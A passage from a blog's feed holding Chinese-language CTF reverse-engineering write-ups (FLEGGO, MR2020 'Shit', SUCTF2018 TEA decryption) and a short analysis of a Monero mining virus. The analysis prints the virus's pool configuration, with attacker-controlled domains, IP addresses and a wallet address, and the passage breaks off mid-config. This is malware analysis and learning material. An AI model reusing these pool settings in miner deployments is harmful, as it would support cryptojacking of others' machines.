class="string">&quot;./lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    cur_file = <span class="built_in">open</span>(f, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    cur_file.seek(<span class="number">0x2AB0</span>)</span><br><span class="line">    read_file = cur_file.read(<span class="number">32</span>)</span><br><span class="line">    password = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> read_file:</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">0</span>:</span><br><span class="line">            password += p.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># print (password)</span></span><br><span class="line">    p = subprocess.Popen(f, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    out, err = p.communicate(password + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print (out)</span></span><br><span class="line">    pic_name = out[<span class="number">47</span>:<span class="number">59</span>]</span><br><span class="line">    char_of_pic = out[<span class="number">-3</span>].to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    os.rename(pic_name, char_of_pic + pic_name)</span><br></pre></td></tr></table></figure><p>输出会说每个图片对应的字符，点开图片后发现左上角有数字，应该是下标</p><p>这tm就是misc啊！</p><p>剩下的就是手动找位置了，屑</p><h1 id="MR2020-Shit"><a href="#MR2020-Shit" class="headerlink" title="[MR2020]Shit"></a>[MR2020]Shit</h1><p>这题最后的解法很屑（</p><p>首先是去花，但花指令和CISCN2021-N的RE2一样，就不细说了</p><p>一直尝试反调试，但一直没成功，就用爆破来解了…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_DA12F0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); i += <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __ROR4__(a1[i + <span class="number">3</span>] | (a1[i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (a1[i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (a1[i] &lt;&lt; <span class="number">24</span>), dword_DA5034[i / <span class="number">4</span>]);</span><br><span class="line">    v5 = ((v4 &lt;&lt; <span class="number">16</span>) | (<span class="keyword">unsigned</span> __int16)~HIWORD(v4)) ^ (<span class="number">1</span> &lt;&lt; dword_DA5034[i / <span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">0</span> )</span><br><span class="line">      v5 ^= v2;</span><br><span class="line">    v2 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != dword_DA5018[i / <span class="number">4</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然每四位进行一系列位运算，且密钥只有六位，那就爆破吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x8C2C133A</span>, <span class="number">0x0F74CB3F6</span>, <span class="number">0x0FEDFA6F2</span>, <span class="number">0x0AB293E3B</span>, <span class="number">0x26CF8A2A</span>, <span class="number">0x88A1F279</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp = a[t]</span><br><span class="line">        <span class="keyword">if</span> t != <span class="number">0</span>:</span><br><span class="line">            tmp = tmp ^ a[t - <span class="number">1</span>]</span><br><span class="line">        tmp = tmp ^ (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">        tmp = ((~tmp &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>) | (tmp &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        res = n2s(((tmp &gt;&gt; (<span class="number">0x20</span> - i)) | (tmp &lt;&lt; i)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">0</span>] &gt; <span class="number">0x20</span> <span class="keyword">and</span> res[<span class="number">0</span>] &lt; <span class="number">0x7f</span>:</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>] &gt; <span class="number">0x20</span> <span class="keyword">and</span> res[<span class="number">1</span>] &lt; <span class="number">0x7f</span>:</span><br><span class="line">                <span class="keyword">if</span> res[<span class="number">2</span>] &gt; <span class="number">0x20</span> <span class="keyword">and</span> res[<span class="number">2</span>] &lt; <span class="number">0x7f</span>:</span><br><span class="line">                    <span class="keyword">if</span> res[<span class="number">3</span>] &gt; <span class="number">0x20</span> <span class="keyword">and</span> res[<span class="number">3</span>] &lt; <span class="number">0x7f</span>:</span><br><span class="line">                        <span class="built_in">print</span> (res)</span><br><span class="line">    <span class="built_in">print</span> ()</span><br></pre></td></tr></table></figure><p>最后甚至直接上四个 <code>if</code> 了…</p><p>爆破结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;flag&#x27;</span> <span class="comment"># 必选</span></span><br><span class="line"><span class="string">b&#x27;,ag&amp;&#x27;</span></span><br><span class="line"><span class="string">b&quot;a&#x27;f,&quot;</span></span><br><span class="line"><span class="string">b&#x27;gf,!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;_2&#123;`&#x27;</span></span><br><span class="line"><span class="string">b&#x27;3&#123;`^&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;a_3&#x27;</span> <span class="comment"># 必选</span></span><br><span class="line"><span class="string">b&#x27;`_3z&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;[a2&#125;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;a2y_&#x27;</span> <span class="comment"># 剩下三个有大括号，排除</span></span><br><span class="line"><span class="string">b&#x27;6&#125;_a&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#125;_e2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;re_f&#x27;</span></span><br><span class="line"><span class="string">b&#x27;e_gs&#x27;</span></span><br><span class="line"><span class="string">b&#x27;^fse&#x27;</span></span><br><span class="line"><span class="string">b&#x27;fsd_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;_4o2&#x27;</span></span><br><span class="line"><span class="string">b&#x27;or_t&#x27;</span></span><br><span class="line"><span class="string">b&#x27;2_t/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;=%st&#x27;</span></span><br><span class="line"><span class="string">b&#x27;est&#125;&#x27;</span> <span class="comment"># 必选</span></span><br><span class="line"><span class="string">b&#x27;s4=e&#x27;</span></span><br><span class="line"><span class="string">b&#x27;t=e3&#x27;</span></span><br></pre></td></tr></table></figure><p>中间根据前后单词拼接一下就行了</p><h1 id="SUCTF2018-HelloPython"><a href="#SUCTF2018-HelloPython" class="headerlink" title="[SUCTF2018]HelloPython"></a>[SUCTF2018]HelloPython</h1><h2 id="解pyc"><a href="#解pyc" class="headerlink" title="解pyc"></a>解pyc</h2><p>uncompyle6</p><h2 id="算法识别"><a href="#算法识别" class="headerlink" title="算法识别"></a>算法识别</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __target: [ (<span class="keyword">lambda</span> __target: [ [ __this() <span class="keyword">for</span> __g[<span class="string">&#x27;n&#x27;</span>] <span class="keyword">in</span> [__operator.isub(__g[<span class="string">&#x27;n&#x27;</span>], <span class="number">1</span>)] ][<span class="number">0</span>] <span class="keyword">for</span> __target.value <span class="keyword">in</span> [__operator.iadd(__target.value, (y.value &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>] ^ y.value + x.value ^ (y.value &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>])] ][<span class="number">0</span>])(z) <span class="keyword">for</span> __target.value <span class="keyword">in</span> [__operator.iadd(__target.value, (z.value &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>] ^ z.value + x.value ^ (z.value &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>])] ][<span class="number">0</span>])(y)</span><br></pre></td></tr></table></figure><p>很明显是tea</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比一下，z是v[1]，x是sum，y是v[0]，或者看下面这段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> __g[<span class="string">&#x27;x&#x27;</span>] <span class="keyword">in</span> [c_uint32(<span class="number">0</span>)] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;z&#x27;</span>] <span class="keyword">in</span> [c_uint32(v[<span class="number">1</span>])] ][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;y&#x27;</span>] <span class="keyword">in</span> [c_uint32(v[<span class="number">0</span>])]</span><br></pre></td></tr></table></figure><h2 id="寻找常数"><a href="#寻找常数" class="headerlink" title="寻找常数"></a>寻找常数</h2><p>delta常数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> __g[<span class="string">&#x27;u&#x27;</span>] <span class="keyword">in</span> [<span class="number">2654435769</span>]</span><br></pre></td></tr></table></figure><p>密钥常数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> __g[<span class="string">&#x27;k&#x27;</span>] <span class="keyword">in</span> [[<span class="number">3735928559</span>, <span class="number">590558003</span>, <span class="number">19088743</span>, <span class="number">4275878552</span>]]</span><br></pre></td></tr></table></figure><p>到题目描述里找到密文 <code>f1f5d29b6e4414ec</code>（这还得自己去github找，离谱）</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">0xf1f5d29b</span>, <span class="number">0x6e4414ec</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">3735928559</span>, <span class="number">590558003</span>, <span class="number">19088743</span>, <span class="number">4275878552</span>&#125;;  </span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数  </span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span></span><br><span class="line">    <span class="comment">// printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);  </span></span><br><span class="line">    <span class="comment">// encrypt(v, k);  </span></span><br><span class="line">    <span class="comment">// printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);  </span></span><br><span class="line">    decrypt(v, k);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%x %x\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>最近遇到了好几道网络编程和squashfs</li><li>还是得好好学一下angr</li><li>Shit这道题还是要看一下别人的WP，学习一下正确的思路</li></ul>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;firmware：工控逆向&lt;/li&gt;
&lt;li&gt;[FlareOn4]greek_to_me：SMC校验&lt;/li&gt;
&lt;li&gt;[FlareOn6]Memecat Battlestation：baby .NET （不写wp了）&lt;/li&gt;
&lt;li&gt;[FlareOn5]FLEGGO&lt;/li&gt;
&lt;li&gt;[MR2020]Shit：花指令&lt;/li&gt;
&lt;li&gt;[SUCTF2018]HelloPython&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="FlareOn" scheme="https://s0uthwood.github.io/tags/FlareOn/"/>
    
  </entry>
  
  <entry>
    <title>记一个挖矿病毒</title>
    <link href="https://s0uthwood.github.io/2021/05/27/%E8%AE%B0%E4%B8%80%E4%B8%AA%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
    <id>https://s0uthwood.github.io/2021/05/27/%E8%AE%B0%E4%B8%80%E4%B8%AA%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/</id>
    <published>2021-05-26T18:10:06.000Z</published>
    <updated>2021-05-26T18:26:35.402Z</updated>
    
    <content type="html"><![CDATA[<p>朋友遇到个病毒，简单记录一下</p><a id="more"></a><p>首先放到VT看一眼</p><p><img data-src="VT1.png" alt=""></p><p>检测率好低啊，不过可以确定是挖矿病毒了</p><p>ida打开一下，知道有壳，跟着走了走，看到UPX字样…</p><p>脱壳，再看</p><p>没有符号化信息，看不动，有的函数引用都找不到，以后有机会再逆吧</p><p>贴个病毒制造者的信息</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">    &quot;pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;algo&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;coin&quot;</span>: <span class="string">&quot;monero&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;xinw.dnsx.xyz:80&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;85yYjA1jZx3AcZtQLo4GmbEypUbV2P3br3jgSc9u8bEZ&#x27;</span></span><br><span class="line"><span class="string">JjzeVtBnzZL5aogUFEDibn5AiL3FWU5gXLJtPFFDiyHfM3wa4Eq&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pass&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rig-id&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;nicehash&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;keepalive&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;tls-fingerprint&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;daemon&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;self-select&quot;</span>: <span class="literal">null</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;algo&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;coin&quot;</span>: <span class="string">&quot;monero&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;45.63.53.146:8081&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pass&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rig-id&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;nicehash&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;keepalive&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;tls-fingerprint&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;daemon&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;self-select&quot;</span>: <span class="literal">null</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;algo&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;coin&quot;</span>: <span class="string">&quot;monero&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;xinl.dnsx.xyz:8080&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;85yYjA1jZx3AcZtQLo4GmbEypUbV2P3br3jgSc9u8bEZ&#x27;</span></span><br><span class="line"><span class="string">JjzeVtBnzZL5aogUFEDibn5AiL3FWU5gXLJtPFFDiyHfM3wa4Eq&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pass&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rig-id&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;nicehash&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;keepalive&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;tls-fingerprint&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;daemon&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;self-select&quot;</span>: <span class="literal">null</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;algo&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;coin&quot;</span>: <span class="string">&quot;monero&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;45.77.87.96:80&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pass&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rig-id&quot;</span>: <span class="literal">null</span>,</span><br><span 